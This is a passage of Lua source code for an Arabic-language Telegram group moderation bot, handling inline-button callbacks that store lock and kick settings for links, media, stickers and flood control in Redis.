local UserId = Text:match('(%d+)/lock_stikearkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Sticker"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الملصقات").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_phonekid') then
local UserId = Text:match('(%d+)/lock_phonekid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Contact"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الجهات").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videonotekid') then
local UserId = Text:match('(%d+)/lock_videonotekid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Unsupported"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل بصمه الفيديو").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_markdaunkid') then
local UserId = Text:match('(%d+)/lock_markdaunkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Markdaun"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الماركدون").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gameskid') then
local UserId = Text:match('(%d+)/lock_gameskid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:geam"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الالعاب").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_floodkid') then
local UserId = Text:match('(%d+)/lock_floodkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:hset(LaRiCa.."Spam:Group:User"..ChatId ,"Spam:User","keed")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التكرار").lockKid, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/lock_linkktm') then
local UserId = Text:match('(%d+)/lock_linkktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Link"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الروابط").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_spamktm') then
local UserId = Text:match('(%d+)/lock_spamktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Spam"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الكلايش").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_keypordktm') then
local UserId = Text:match('(%d+)/lock_keypordktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Keyboard"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الكيبورد").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_voicektm') then
local UserId = Text:match('(%d+)/lock_voicektm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:vico"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الاغاني").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gifktm') then
local UserId = Text:match('(%d+)/lock_gifktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Animation"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل المتحركات").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_filesktm') then
local UserId = Text:match('(%d+)/lock_filesktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Document"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الملفات").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videoktm') then
local UserId = Text:match('(%d+)/lock_videoktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Video"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الفيديو").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_photoktm') then
local UserId = Text:match('(%d+)/lock_photoktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Photo"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الصور").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_usernamektm') then
local UserId = Text:match('(%d+)/lock_usernamektm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:User:Name"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل المعرفات").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_tagsktm') then
local UserId = Text:match('(%d+)/lock_tagsktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:hashtak"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التاك").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fwdktm') then
local UserId = Text:match('(%d+)/lock_fwdktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:forward"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التوجيه").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_audioktm') then
local UserId = Text:match('(%d+)/lock_audioktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Audio"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الصوت").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_stikearktm') then
local UserId = Text:match('(%d+)/lock_stikearktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Sticker"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الملصقات").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_phonektm') then
local UserId = Text:match('(%d+)/lock_phonektm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Contact"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الجهات").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videonotektm') then
local UserId = Text:match('(%d+)/lock_videonotektm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Unsupported"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل بصمه الفيديو").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_markdaunktm') then
local UserId = Text:match('(%d+)/lock_markdaunktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Markdaun"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الماركدون").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gamesktm') then
local UserId = Text:match('(%d+)/lock_gamesktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:geam"..ChatId,"ktm")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الالعاب").lockKtm, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_floodktm') then
local UserId = Text:match('(%d+)/lock_floodktm')
if tonumber(IdUser) == tonumber(UserId) then
Redis:hset(LaRiCa.."Spam:Group:User"..ChatId ,"Spam:User","mute")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التكرار").lockKtm, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/lock_linkkick') then
local UserId = Text:match('(%d+)/lock_linkkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Link"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الروابط").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_spamkick') then
local UserId = Text:match('(%d+)/lock_spamkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Spam"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الكلايش").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_keypordkick') then
local UserId = Text:match('(%d+)/lock_keypordkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Keyboard"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الكيبورد").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_voicekick') then
local UserId = Text:match('(%d+)/lock_voicekick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:vico"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الاغاني").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gifkick') then
local UserId = Text:match('(%d+)/lock_gifkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Animation"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل المتحركات").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fileskick') then
local UserId = Text:match('(%d+)/lock_fileskick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Document"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الملفات").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videokick') then
local UserId = Text:match('(%d+)/lock_videokick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Video"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الفيديو").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_photokick') then
local UserId = Text:match('(%d+)/lock_photokick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Photo"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الصور").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_usernamekick') then
local UserId = Text:match('(%d+)/lock_usernamekick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:User:Name"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل المعرفات").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_tagskick') then
local UserId = Text:match('(%d+)/lock_tagskick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:hashtak"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التاك").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fwdkick') then
local UserId = Text:match('(%d+)/lock_fwdkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:forward"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التوجيه").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_audiokick') then
local UserId = Text:match('(%d+)/lock_audiokick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Audio"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الصوت").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_stikearkick') then
local UserId = Text:match('(%d+)/lock_stikearkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Sticker"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الملصقات").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_phonekick') then
local UserId = Text:match('(%d+)/lock_phonekick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Contact"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الجهات").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videonotekick') then
local UserId = Text:match('(%d+)/lock_videonotekick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Unsupported"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل بصمه الفيديو").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_markdaunkick') then
local UserId = Text:match('(%d+)/lock_markdaunkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Markdaun"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الماركدون").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gameskick') then
local UserId = Text:match('(%d+)/lock_gameskick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:geam"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الالعاب").lockKick, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_floodkick') then
local UserId = Text:match('(%d+)/lock_floodkick')
if tonumber(IdUser) == tonumber(UserId) then
Redis:hset(LaRiCa.."Spam:Group:User"..ChatId ,"Spam:User","kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التكرار").lockKick, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/unmute_link') then
local UserId = Text:match('(%d+)/unmute_link')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Status:Link"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تعطيل امر الرابط").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_welcome') then
local UserId = Text:match('(%d+)/unmute_welcome')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Status:Welcome"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تعطيل امر الترحيب").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_Id') then
local UserId = Text:match('(%d+)/unmute_Id')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Status:Id"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تعطيل امر الايدي").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_IdPhoto') then
local UserId = Text:match('(%d+)/unmute_IdPhoto')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Status:IdPhoto"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تعطيل امر الايدي بالصوره").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_ryple') then
local UserId = Text:match('(%d+)/unmute_ryple')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Status:Reply"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تعطيل امر الردود").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_ryplesudo') then
local UserId = Text:match('(%d+)/unmute_ryplesudo')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Status:ReplySudo"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تعطيل امر الردود العامه").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_setadmib') then
local UserId = Text:match('(%d+)/unmute_setadmib')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Status:SetId"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تعطيل امر الرفع").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_kickmembars') then
local UserId = Text:match('(%d+)/unmute_kickmembars')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Status:BanId"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تعطيل امر الطرد - الحظر").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_games') then
local UserId = Text:match('(%d+)/unmute_games')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Status:Games"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تعطيل امر الالعاب").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unmute_kickme') then
local UserId = Text:match('(%d+)/unmute_kickme')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Status:KickMe"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تعطيل امر اطردني").unLock, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/mute_link') then
local UserId = Text:match('(%d+)/mute_link')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Status:Link"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تفعيل امر الرابط").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_welcome') then
local UserId = Text:match('(%d+)/mute_welcome')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Status:Welcome"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تفعيل امر الترحيب").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_Id') then
local UserId = Text:match('(%d+)/mute_Id')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Status:Id"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تفعيل امر الايدي").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_IdPhoto') then
local UserId = Text:match('(%d+)/mute_IdPhoto')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Status:IdPhoto"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تفعيل امر الايدي بالصوره").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_ryple') then
local UserId = Text:match('(%d+)/mute_ryple')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Status:Reply"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تفعيل امر الردود").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_ryplesudo') then
local UserId = Text:match('(%d+)/mute_ryplesudo')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Status:ReplySudo"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تفعيل امر الردود العامه").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_setadmib') then
local UserId = Text:match('(%d+)/mute_setadmib')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Status:SetId"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تفعيل امر الرفع").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_kickmembars') then
local UserId = Text:match('(%d+)/mute_kickmembars')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Status:BanId"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم تفعيل امر الطرد - الحظر").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/mute_games') then
local UserId = Text:match('(%d+)/mute_games')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Status:Games"..ChatId,true) 
